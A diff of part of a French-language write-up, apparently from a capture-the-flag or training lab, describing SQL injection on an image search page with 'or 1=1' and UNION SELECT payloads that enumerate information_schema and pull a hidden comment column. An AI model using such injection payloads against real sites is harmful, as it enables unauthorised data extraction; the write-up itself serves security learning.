@@ -11,13 +11,13 @@ La page de recherche d’images (`searchimg`) est vulnérable à une **injection
 - En injectant `1 or 1=1`, un attaquant peut contourner la clause `WHERE` et afficher **toutes les images**.
 - Utilisation de l’instruction `UNION` pour extraire d'autres colonnes depuis une autre table :
 ```sql
-id=1 or 1=1 UNION SELECT table_name, column_name FROM information_schema.columns
+1 or 1=1 UNION SELECT table_name, column_name FROM information_schema.columns
 ```
 - Cela révèle une table nommée **list_images**, avec une colonne intéressante : **comment**
 
 - Requête finale pour exfiltrer des données :
 ```sql
-id=1 or 1=1 UNION SELECT url, comment FROM list_images
+1 or 1=1 UNION SELECT url, comment FROM list_images
 ```
 - Cette requête retourne une **consigne cachée** dans la colonne `comment` :
 ```
